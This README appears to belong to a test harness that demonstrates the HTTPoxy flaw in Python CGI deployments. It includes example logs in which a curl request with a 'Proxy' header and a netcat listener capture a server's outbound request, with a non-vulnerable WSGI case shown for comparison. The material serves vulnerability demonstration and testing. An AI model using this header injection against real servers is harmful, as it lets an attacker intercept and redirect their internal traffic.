# Python HTTPoxy Vulnerability under CGI

Python is not usually deployed under CGI. But there are guides that provide for CGI as a deployment
mechanism of last resort.

When using something like wsgiref.handlers.CGIHandler, the os.environ map is polluted by CGI values,
including HTTP_PROXY.

Run `./build` to get started

There are two test cases:

* cgi (vulnerable), and
* wsgi (not vulnerable)

## Example run

### cgi

```
Testing: cgi/apache...
Testing done.


Here's the curl output from the curl client
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    59  100    59    0     0     76      0 --:--:-- --:--:-- --:--:--    76
A server error occurred.  Please contact the administrator.

Tests finished. Result time...
Here is the output from the cgi program and apache logs:
./build: line 78:  3067 Terminated              nc -v -l 12345 > ./cgi-mallory.log 2>&1
==> /var/log/apache2/access.log <==
172.17.0.1 - - [02/Jul/2016:08:18:11 +0000] "GET /httpoxy HTTP/1.1" 500 246 "-" "curl/7.35.0"

==> /var/log/apache2/error.log <==
    return request('get', url, **kwargs)
  File "/usr/lib/python2.7/dist-packages/requests/api.py", line 49, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/lib/python2.7/dist-packages/requests/sessions.py", line 457, in request
    resp = self.send(prep, **send_kwargs)
  File "/usr/lib/python2.7/dist-packages/requests/sessions.py", line 569, in send
    r = adapter.send(request, **kwargs)
  File "/usr/lib/python2.7/dist-packages/requests/adapters.py", line 407, in send
    raise ConnectionError(err, request=request)
ConnectionError: ('Connection aborted.', BadStatusLine("''",))

==> /var/log/apache2/other_vhosts_access.log <==


And here is what the attacker got (any output other than a listening line here means trouble)
Listening on [0.0.0.0] (family 0, port 12345)
Connection from [172.17.0.3] port 12345 [tcp/*] accepted (family 2, sport 44423)
GET http://example.com/ HTTP/1.1
Host: example.com
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.4.3 CPython/2.7.9 Linux/3.13.0-85-generic

end of trouble
```

### wsgi

```
Testing: wsgi/apache
Testing done.


Here's the curl output from the curl client
* Hostname was NOT found in DNS cache
*   Trying 127.0.0.1...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 127.0.0.1 (127.0.0.1) port 2083 (#0)
> GET / HTTP/1.1
> User-Agent: curl/7.35.0
> Host: 127.0.0.1:2083
> Accept: */*
> Proxy: 172.17.0.1:12345
>
< HTTP/1.1 200 OK
< Date: Sat, 02 Jul 2016 07:05:14 GMT
* Server Apache is not blacklisted
< Server: Apache
< Content-Length: 1485
< Connection: close
< Content-Type: text/plain
<
{ [data not shown]
100  1485  100  1485    0     0   3578      0 --:--:-- --:--:-- --:--:--  3586
* Closing connection 0

    Made internal subrequest to http://example.com/ and got:
      os.environ[HTTP_PROXY]: none
      os.getenv('HTTP_PROXY'): none
      wsgi Proxy header: 172.17.0.1:12345
      status code: 200
      text: <!doctype html>
<html>
<head>
    <title>Example Domain</title>

    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style type="text/css">
    body {
        background-color: #f0f0f2;
        margin: 0;
        padding: 0;
        font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;

    }
    div {
        width: 600px;
        margin: 5em auto;
        padding: 50px;
        background-color: #fff;
        border-radius: 1em;
    }
    a:link, a:visited {
        color: #38488f;
        text-decoration: none;
    }
    @media (max-width: 700px) {
        body {
            background-color: #fff;
        }
        div {
            width: auto;
            margin: 0 auto;
            border-radius: 0;
            padding: 1em;
        }
    }
    </style>
</head>

<body>
<div>
    <h1>Example Domain</h1>
    <p>This domain is established to be used for illustrative examples in documents. You may use this
    domain in examples without prior coordination or asking for permission.</p>
    <p><a href="http://www.iana.org/domains/example">More information...</a></p>
</div>
</body>
</html>



Tests finished. Result time...
Here is the nginx logs (containing output from the wsgi program)
./build: line 56: 26424 Terminated              nc -v -l 12345 > ./wsgi-mallory.log 2>&1
[Sat Jul 02 07:05:09.264581 2016] [mpm_event:notice] [pid 15:tid 139675532297984] AH00489: Apache/2.4.20 (Unix) mod_wsgi/4.5.2 Python/3.5.1 configured -- resuming normal operations
[Sat Jul 02 07:05:09.264934 2016] [core:notice] [pid 15:tid 139675532297984] AH00094: Command line: 'httpd (mod_wsgi-express) -f /tmp/mod_wsgi-localhost:80:0/httpd.conf -E /dev/stderr -D MOD_WSGI_MPM_ENABLE_EVENT_MODULE -D MOD_WSGI_MPM_EXISTS_EVENT_MODULE -D MOD_WSGI_MPM_EXISTS_WORKER_MODULE -D MOD_WSGI_MPM_EXISTS_PREFORK_MODULE -D FOREGROUND'


And here is what the attacker got (any output other than a listening line here means trouble)
Listening on [0.0.0.0] (family 0, port 12345)
end of trouble
```

## Results

### wsgi not vulnerable

Because the user-supplied values are kept in a separate wsgi 'environ' map, wsgi is not
vulnerable. `os.environ['HTTP_PROXY']` remains unchanged when a `Proxy: foo` header is sent.

### cgi vulnerable

When using the `CGIHandler` in `wsgiref.handlers`, and deploying your application with a standard
CGI server, os.environ['HTTP_PROXY'] is a user-controlled value, and should not be trusted.

requests trusts this value, and configures it as the proxy. The internal request to example.com ends up
proxied at an address of the attacker's choosing.
